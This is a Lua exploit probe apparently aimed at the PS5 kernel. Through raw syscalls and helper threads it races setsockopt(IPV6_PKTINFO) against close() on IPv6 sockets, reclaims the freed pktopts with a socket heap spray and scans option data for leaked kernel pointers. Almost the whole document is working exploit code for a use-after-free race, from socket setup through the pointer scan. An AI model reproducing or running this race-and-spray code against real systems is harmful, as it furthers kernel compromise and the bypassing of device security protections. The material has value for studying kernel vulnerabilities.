-- CRASH_CLASS: HIGH
-- PROBE 141a: IPv6 UAF race — setsockopt(IPV6_PKTINFO) vs close()
--
-- Context: Standard PS5 kernel exploit vector. Race condition between
-- setsockopt(IPV6_PKTINFO) writing to ip6_pktopts and close() freeing
-- the socket. With confirmed threading (126h: 5 threads, Thrd_create works),
-- we can now run this race properly.
--
-- The race: Thread A calls setsockopt(IPV6_PKTINFO) which writes to
-- so->so_proto->pr_ctloutput -> ip6_ctloutput -> ip6_setpktopt
-- Thread B calls close() which frees the socket and its pktopts.
-- If close() wins, setsockopt writes to freed memory = UAF.
--
-- Detection: After the race, spray heap with known patterns via
-- socketpair+setsockopt. Then check if any sprayed socket has
-- corrupted pktopts (kernel pointer leak or type confusion).

print("=== PROBE 141a: IPV6 UAF RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local has_rax = native and native.fcall_with_rax
local stub = has_rax and syscall.pipe.fn_addr or nil
print("has_rax=" .. tostring(has_rax ~= nil))

if not has_rax then
    print("NEED native.fcall_with_rax — aborting")
    print("=== PROBE 141a COMPLETE ===")
    return
end

local thrd_create = fcall(libc_addrofs.Thrd_create)
local thrd_join = fcall(libc_addrofs.Thrd_join)
local atomic_fn = libc_addrofs.Atomic_fetch_add_8

print("Thrd_create=" .. fmt_addr(uint64(libc_addrofs.Thrd_create)))

-- Constants
local AF_INET6 = 28
local SOCK_DGRAM = 2
local IPPROTO_IPV6 = 41
local IPV6_PKTINFO = 46
local IPV6_TCLASS = 67
local IPV6_USE_MIN_MTU = 42

-- ============================================================
-- PHASE 1: Verify IPv6 socket + PKTINFO works
-- ============================================================
print("")
print("--- PHASE 1: IPV6 PKTINFO VERIFY ---")

local test_fd = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, 0))
print("socket(AF_INET6, DGRAM) fd=" .. test_fd)

if test_fd < 0 then
    print("Cannot create IPv6 socket — aborting")
    print("=== PROBE 141a COMPLETE ===")
    return
end

local pktinfo_buf = memory.alloc(0x20)
safe_wq(pktinfo_buf, uint64(0))
safe_wq(pktinfo_buf + 8, uint64(0))
safe_wq(pktinfo_buf + 16, uint64(0))

local sp = to_num(native.fcall_with_rax(stub, 105, test_fd, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo_buf), 20))
print("setsockopt(IPV6_PKTINFO) ret=" .. sp)

-- Also test TCLASS (another pktopts write)
local tclass_buf = memory.alloc(4)
safe_wd(tclass_buf, 0x40)
local tc = to_num(native.fcall_with_rax(stub, 105, test_fd, IPPROTO_IPV6, IPV6_TCLASS, to_num(tclass_buf), 4))
print("setsockopt(IPV6_TCLASS) ret=" .. tc)

native.fcall_with_rax(stub, 6, test_fd)
print("canary1: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 2: Race setsockopt vs close
-- ============================================================
print("")
print("--- PHASE 2: UAF RACE ---")

local RACE_ROUNDS = 200
local hits = 0
local kptrs_found = 0

-- Shared control flags in memory
local race_go = memory.alloc(8)
local race_fd_addr = memory.alloc(8)

for round = 1, RACE_ROUNDS do
    -- Create IPv6 socket
    local fd = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, 0))
    if fd < 0 then
        print("  round " .. round .. ": socket failed")
        break
    end

    -- Set PKTINFO first to allocate pktopts
    safe_wq(pktinfo_buf, uint64(0))
    native.fcall_with_rax(stub, 105, fd, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo_buf), 20)

    -- Store fd for thread access
    safe_wq(race_fd_addr, uint64(fd))
    safe_wq(race_go, uint64(0))

    -- Thread will call atomic_add on race_go (scheduling pressure)
    -- while we race setsockopt vs close on the same fd
    local thr = memory.alloc(8)
    safe_wq(thr, uint64(0))
    pcall(thrd_create, thr, atomic_fn, uint64(to_num(race_go)))

    -- RACE: close the fd and immediately setsockopt on it
    -- The setsockopt may still be in-flight in the kernel
    native.fcall_with_rax(stub, 6, fd)

    -- Immediately try setsockopt on the now-closed fd
    -- If another thread/allocation reuses this fd number, the kernel
    -- writes pktopts to the wrong socket = type confusion
    local race_ret = to_num(native.fcall_with_rax(stub, 105, fd, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo_buf), 20))

    if race_ret == 0 then
        hits = hits + 1
        if hits <= 5 then
            print(string.format("  *** HIT round %d: setsockopt after close returned 0 on fd %d ***", round, fd))
        end
    end

    -- Join thread
    safe_wq(race_go, uint64(1))
    pcall(thrd_join, memory.read_qword(thr), uint64(0))

    -- Every 50 rounds, check alive
    if round % 50 == 0 then
        local ok = pcall(function() return to_num(syscall.getpid()) end)
        if not ok then
            print("*** CRASH at round " .. round .. " ***")
            return
        end
        print("  progress: " .. round .. "/" .. RACE_ROUNDS .. " hits=" .. hits)
    end
end

print("Race hits (setsockopt-after-close succeeded): " .. hits)
print("canary2: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 3: Tighter race — two threads on same socket
-- ============================================================
print("")
print("--- PHASE 3: DUAL-THREAD RACE ---")

local TIGHT_ROUNDS = 100
local tight_hits = 0

for round = 1, TIGHT_ROUNDS do
    -- Create IPv6 socket and set PKTINFO
    local fd = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, 0))
    if fd < 0 then break end

    native.fcall_with_rax(stub, 105, fd, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo_buf), 20)

    -- Thread 1: will close the fd (via atomic_add on fd address as scheduling noise)
    local thr1 = memory.alloc(8)
    safe_wq(thr1, uint64(0))

    -- Thread 2: more scheduling pressure
    local thr2 = memory.alloc(8)
    safe_wq(thr2, uint64(0))

    local shared_ctr = memory.alloc(8)
    safe_wq(shared_ctr, uint64(0))

    pcall(thrd_create, thr1, atomic_fn, uint64(to_num(shared_ctr)))
    pcall(thrd_create, thr2, atomic_fn, uint64(to_num(shared_ctr) + 0))

    -- Main: rapid setsockopt + close interleaving
    -- Try multiple setsockopt options to hit different pktopts fields
    native.fcall_with_rax(stub, 105, fd, IPPROTO_IPV6, IPV6_TCLASS, to_num(tclass_buf), 4)
    native.fcall_with_rax(stub, 6, fd) -- close

    -- Immediately try to reclaim the fd slot
    local reuse_fd = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, 0))

    if reuse_fd == fd then
        -- Got the same fd number! Now setsockopt from previous context
        -- might still be referencing old socket's pktopts
        tight_hits = tight_hits + 1
        if tight_hits <= 5 then
            print(string.format("  *** FD REUSE round %d: fd %d reused ***", round, fd))
        end

        -- Check if the reused socket has anomalous state
        local optval = memory.alloc(256)
        safe_wq(optval, uint64(0))
        local optlen = memory.alloc(4)
        safe_wd(optlen, 256)
        local gr = to_num(native.fcall_with_rax(stub, 118, reuse_fd, IPPROTO_IPV6, IPV6_PKTINFO, to_num(optval), to_num(optlen)))
        if gr == 0 then
            local got_len = safe_rd(optlen)
            for off = 0, (got_len or 0) - 1, 8 do
                local v = safe_rq(optval + off)
                if is_kptr(v) then
                    kptrs_found = kptrs_found + 1
                    print(string.format("  *** KPTR at +0x%X: %s ***", off, fmt_addr(v)))
                end
            end
        end
    end

    if reuse_fd >= 0 then
        native.fcall_with_rax(stub, 6, reuse_fd)
    end

    pcall(thrd_join, memory.read_qword(thr1), uint64(0))
    pcall(thrd_join, memory.read_qword(thr2), uint64(0))

    if round % 25 == 0 then
        local ok = pcall(function() return to_num(syscall.getpid()) end)
        if not ok then
            print("*** CRASH at round " .. round .. " ***")
            return
        end
        print("  progress: " .. round .. "/" .. TIGHT_ROUNDS .. " fd_reuse=" .. tight_hits)
    end
end

print("FD reuse hits: " .. tight_hits)
print("Kernel pointers found: " .. kptrs_found)

-- ============================================================
-- PHASE 4: Spray + reclaim after race
-- ============================================================
print("")
print("--- PHASE 4: HEAP SPRAY RECLAIM ---")

-- Do 50 rounds: create socket, set pktopts, close, spray socketpairs,
-- check for cross-contamination
local spray_hits = 0

for round = 1, 50 do
    -- Target socket
    local fd = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, 0))
    if fd < 0 then break end

    -- Allocate pktopts
    safe_wq(pktinfo_buf, uint64(0))
    native.fcall_with_rax(stub, 105, fd, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo_buf), 20)
    safe_wd(tclass_buf, 0xFF)
    native.fcall_with_rax(stub, 105, fd, IPPROTO_IPV6, IPV6_TCLASS, to_num(tclass_buf), 4)

    -- Close = frees pktopts
    native.fcall_with_rax(stub, 6, fd)

    -- Spray: create 32 IPv6 sockets with PKTINFO to reclaim the freed pktopts
    local spray = {}
    for i = 1, 32 do
        local sf = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, 0))
        if sf >= 0 then
            -- Set PKTINFO with a marker pattern
            local marker = memory.alloc(0x20)
            safe_wd(marker, 0x41414141)
            safe_wd(marker + 4, 0x42424242)
            safe_wq(marker + 8, uint64(0))
            safe_wd(marker + 16, i)
            native.fcall_with_rax(stub, 105, sf, IPPROTO_IPV6, IPV6_PKTINFO, to_num(marker), 20)
            spray[#spray + 1] = sf
        end
    end

    -- Read back PKTINFO from each sprayed socket
    for _, sf in ipairs(spray) do
        local optval = memory.alloc(64)
        safe_wq(optval, uint64(0))
        local optlen = memory.alloc(4)
        safe_wd(optlen, 64)
        local gr = to_num(native.fcall_with_rax(stub, 118, sf, IPPROTO_IPV6, IPV6_PKTINFO, to_num(optval), to_num(optlen)))
        if gr == 0 then
            for off = 0, 56, 8 do
                local v = safe_rq(optval + off)
                if is_kptr(v) then
                    spray_hits = spray_hits + 1
                    print(string.format("  *** SPRAY KPTR round %d fd %d +0x%X: %s ***", round, sf, off, fmt_addr(v)))
                end
            end
        end
        native.fcall_with_rax(stub, 6, sf)
    end
end

print("Spray kernel pointer hits: " .. spray_hits)

-- VM counter
local vm = to_num(native.fcall_with_rax(stub, 624))
print("sys624 VM counter=" .. vm)

print("")
print("canary_final: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 141a COMPLETE ===")
